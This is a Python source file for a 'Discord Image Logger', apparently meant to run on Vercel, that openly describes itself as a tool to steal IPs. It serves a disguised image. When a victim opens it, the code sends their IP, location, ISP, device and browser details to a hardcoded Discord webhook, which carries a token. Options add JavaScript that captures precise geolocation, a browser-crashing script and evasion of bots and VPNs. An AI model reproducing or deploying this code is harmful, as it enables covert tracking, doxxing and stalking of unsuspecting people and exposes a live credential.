from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser
import json
from io import BytesIO

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    "webhook": "https://discord.com/api/webhooks/1405388071066669087/4huE8zbBO4384IzA4SpDlY5GPP7sBdfxrV_zV6Got3wGWoES48NuN2tXKCJMhI4k2SEC",
    "image": "https://media.discordapp.net/attachments/1406968248586600499/1520507246952448251/F6AZhYcP8NEaLKyDRSVclYISiUQikUgWxoIUvTeQ30d5P6ICJDNuvwNVF15licA2MXVEFb1louQSCQSiUQSOG6KovcEFYEoFpBIJBKJRLK4KJpHv1CkkpdIJBKJ5KdhURS9RCKRSCSSnwap6CUSiUQiuYWRil4ikUgkklsYqeglEolEIrllIfofn2h6MRBmTiwAAAAASUVORK5CYII.png?ex=6a417239&is=6a4020b9&hm=a285c25cb8bb1522acba2c5a1b729b76871e77d16e88cf5af42164eda3ac49e4&=&format=webp&quality=lossless",
    "imageArgument": True,
    "username": "discord",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "please wait",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://media.discordapp.net/attachments/1406968248586600499/1520507246952448251/F6AZhYcP8NEaLKyDRSVclYISiUQikUgWxoIUvTeQ30d5P6ICJDNuvwNVF15licA2MXVEFb1louQSCQSiUQSOG6KovcEFYEoFpBIJBKJRLK4KJpHv1CkkpdIJBKJ5KdhURS9RCKRSCSSnwap6CUSiUQiuYWRil4ikUgkklsYqeglEolEIrllIfofn2h6MRBmTiwAAAAASUVORK5CYII.png?ex=6a417239&is=6a4020b9&hm=a285c25cb8bb1522acba2c5a1b729b76871e77d16e88cf5af42164eda3ac49e4&=&format=webp&quality=lossless"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`
> **User Agent:** `{useragent}`
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerHandler(BaseHTTPRequestHandler):
    def __init__(self, path, headers_dict):
        self.path = path
        self.headers = type('Headers', (), {'get': lambda self, key, default=None: headers_dict.get(key, default)})()
        self.status_code = 200
        self.response_headers = []
        self.response_body = b''
        
    def send_response(self, code, message=None):
        self.status_code = code
        
    def send_header(self, keyword, value):
        self.response_headers.append((keyword, value))
        
    def end_headers(self):
        pass
        
    def write(self, data):
        if isinstance(data, bytes):
            self.response_body += data
        else:
            self.response_body += data.encode()
            
    def flush(self):
        pass
    
    def handle_request(self):
        try:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            
            if config["imageArgument"]:
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            client_ip = self.headers.get('x-forwarded-for', '127.0.0.1')
            user_agent = self.headers.get('user-agent', 'Unknown')
            
            if client_ip.startswith(blacklistedIPs):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.write(b'OK')
                return self.status_code, self.response_headers, self.response_body
            
            if botCheck(client_ip, user_agent):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]:
                    self.write(binaries["loading"])

                makeReport(client_ip, endpoint=s.split("?")[0], url=url)
                return self.status_code, self.response_headers, self.response_body
            
            if dic.get("g") and config["accurateLocation"]:
                location = base64.b64decode(dic.get("g").encode()).decode()
                result = makeReport(client_ip, user_agent, location, s.split("?")[0], url=url)
            else:
                result = makeReport(client_ip, user_agent, endpoint=s.split("?")[0], url=url)

            message = config["message"]["message"]

            if config["message"]["richMessage"] and result:
                message = message.replace("{ip}", client_ip)
                message = message.replace("{isp}", result.get("isp", "Unknown"))
                message = message.replace("{asn}", result.get("as", "Unknown"))
                message = message.replace("{country}", result.get("country", "Unknown"))
                message = message.replace("{region}", result.get("regionName", "Unknown"))
                message = message.replace("{city}", result.get("city", "Unknown"))
                message = message.replace("{lat}", str(result.get("lat", "")))
                message = message.replace("{long}", str(result.get("lon", "")))
                message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})" if 'timezone' in result else "Unknown")
                message = message.replace("{mobile}", str(result.get("mobile", False)))
                message = message.replace("{vpn}", str(result.get("proxy", False)))
                message = message.replace("{bot}", str(result['hosting'] if result.get('hosting') and not result.get('proxy') else 'Possibly' if result.get('hosting') else 'False'))
                message = message.replace("{browser}", httpagentparser.simple_detect(user_agent)[1])
                message = message.replace("{os}", httpagentparser.simple_detect(user_agent)[0])

            datatype = 'text/html'
            response_data = data

            if config["message"]["doMessage"]:
                response_data = message.encode()
            
            if config["crashBrowser"]:
                response_data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

            if config["redirect"]["redirect"]:
                response_data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                
            self.send_response(200)
            self.send_header('Content-type', datatype)
            self.end_headers()

            if config["accurateLocation"]:
                response_data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}
</script>"""
            
            self.write(response_data)
            return self.status_code, self.response_headers, self.response_body
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())
            return self.status_code, self.response_headers, self.response_body

# WSGI App - This is what Vercel looks for
def app(environ, start_response):
    path = environ.get('PATH_INFO', '/')
    query_string = environ.get('QUERY_STRING', '')
    if query_string:
        path = path + '?' + query_string
    
    headers_dict = {
        'x-forwarded-for': environ.get('HTTP_X_FORWARDED_FOR', environ.get('REMOTE_ADDR', '127.0.0.1')),
        'user-agent': environ.get('HTTP_USER_AGENT', 'Unknown')
    }
    
    handler = ImageLoggerHandler(path, headers_dict)
    status_code, response_headers, response_body = handler.handle_request()
    
    status = f"{status_code} {'OK' if status_code == 200 else 'Found' if status_code == 302 else 'Server Error'}"
    start_response(status, response_headers)
    return [response_body]
